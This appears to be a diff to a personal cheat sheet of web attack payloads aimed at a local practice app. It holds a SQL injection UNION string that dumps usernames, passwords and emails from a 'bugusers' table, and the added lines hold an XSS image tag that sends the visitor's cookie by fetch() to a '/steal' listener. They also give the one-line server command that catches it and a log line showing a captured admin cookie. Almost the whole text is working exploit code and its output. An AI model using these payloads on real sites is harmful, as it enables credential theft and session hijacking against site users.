@@ -6,3 +6,9 @@ SQL UNION
 http://127.0.0.1:5000/rezepte?search=%' UNION SELECT id, username, password, email_address, 'x', 'x' FROM bugusers -- -
 
 %' UNION SELECT id, username, password, email_address, 'x', 'x' FROM bugusers -- -
+
+XSS cookie
+<img src=x onerror="fetch('http://127.0.0.1:8000/steal?cookie=' + document.cookie)">
+python -m http.server 8000
+-->::ffff:127.0.0.1 - - [18/Nov/2025 08:18:03] "GET /steal?cookie=username=admin HTTP/1.1" 404 -
+
